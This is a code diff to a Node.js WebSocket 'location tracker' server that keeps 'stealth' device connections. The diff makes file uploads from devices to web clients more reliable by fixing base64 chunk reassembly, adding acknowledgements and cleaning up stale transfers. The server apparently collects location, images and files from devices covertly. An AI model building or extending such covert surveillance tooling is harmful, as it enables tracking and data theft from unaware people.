@@ -19,6 +19,7 @@ const stealthConnections = new Map(); // deviceId -> { ws, lastSeen, latestImage
 const webClients = new Set();
 const deviceFileCache = new Map();
 const fileChunkBuffers = new Map(); // file_id -> { filename, total_chunks, total_size, chunks[], received }
+const completedFileIds = new Map(); // file_id -> timestamp, prevents double-processing on retransmit
 
 console.log("Starting location tracker server...");
 
@@ -282,6 +283,17 @@ wss.on("connection", (ws, req) => {
         if (msg.type === "file_chunk") {
             const { file_id, filename, chunk_index, total_chunks, data, total_size } = msg;
 
+            // Если этот file_id уже был успешно собран — игнорируем повторную передачу
+            // и снова шлём ack, чтобы устройство перестало ретранслировать
+            if (completedFileIds.has(file_id)) {
+                try {
+                    if (isWsOpen(ws)) {
+                        ws.send(JSON.stringify({ type: 'file_received', file_id, filename }));
+                    }
+                } catch (e) {}
+                return;
+            }
+
             if (!fileChunkBuffers.has(file_id)) {
                 fileChunkBuffers.set(file_id, {
                     filename,
@@ -289,7 +301,8 @@ wss.on("connection", (ws, req) => {
                     total_size,
                     chunks: new Array(total_chunks).fill(null),
                     received: 0,
-                    deviceId
+                    deviceId,
+                    startedAt: Date.now()
                 });
             }
 
@@ -311,8 +324,33 @@ wss.on("connection", (ws, req) => {
 
             // Все чанки получены — собираем файл и отправляем клиенту
             if (transfer.received === total_chunks) {
-                const fullData = transfer.chunks.join('');
+                // Каждый чанк закодирован base64 отдельно — декодируем по одному,
+                // конкатенируем бинарные буферы, затем кодируем весь файл в base64 один раз.
+                // join('') даёт невалидный base64: символы '=' (padding) оказываются в середине.
+                let fullData;
+                try {
+                    const buffers = transfer.chunks.map(chunk => Buffer.from(chunk, 'base64'));
+                    fullData = Buffer.concat(buffers).toString('base64');
+                } catch (e) {
+                    console.error(`❌ Error assembling file ${filename}:`, e);
+                    fileChunkBuffers.delete(file_id);
+                    return;
+                }
+
                 console.log(`📥 File assembled: ${filename} from ${deviceId} (${total_size} bytes, ${total_chunks} chunks)`);
+
+                // Отправляем ack устройству, чтобы оно прекратило ретрансляцию
+                try {
+                    if (isWsOpen(ws)) {
+                        ws.send(JSON.stringify({ type: 'file_received', file_id, filename }));
+                    }
+                } catch (e) {
+                    console.error("Error sending file_received ack:", e);
+                }
+
+                // Запоминаем file_id как завершённый (храним 5 минут)
+                completedFileIds.set(file_id, Date.now());
+
                 broadcastToWebClients({
                     type: "file_download",
                     deviceId,
@@ -881,6 +919,19 @@ setInterval(() => {
   for (const [deviceId, cache] of deviceFileCache) {
     if (now - cache.timestamp > 60 * 1000) {
       deviceFileCache.delete(deviceId);
+    }
+  }
+  // Cleanup incomplete chunk transfers stuck longer than 10 minutes (device disconnected mid-transfer)
+  for (const [file_id, transfer] of fileChunkBuffers) {
+    if (now - transfer.startedAt > 10 * 60 * 1000) {
+      console.warn(`🗑️ Dropping stale incomplete transfer: ${transfer.filename} (${transfer.received}/${transfer.total_chunks} chunks)`);
+      fileChunkBuffers.delete(file_id);
+    }
+  }
+  // Cleanup completed file id cache older than 5 minutes
+  for (const [file_id, completedAt] of completedFileIds) {
+    if (now - completedAt > 5 * 60 * 1000) {
+      completedFileIds.delete(file_id);
     }
   }
 }, 5 * 60 * 1000);
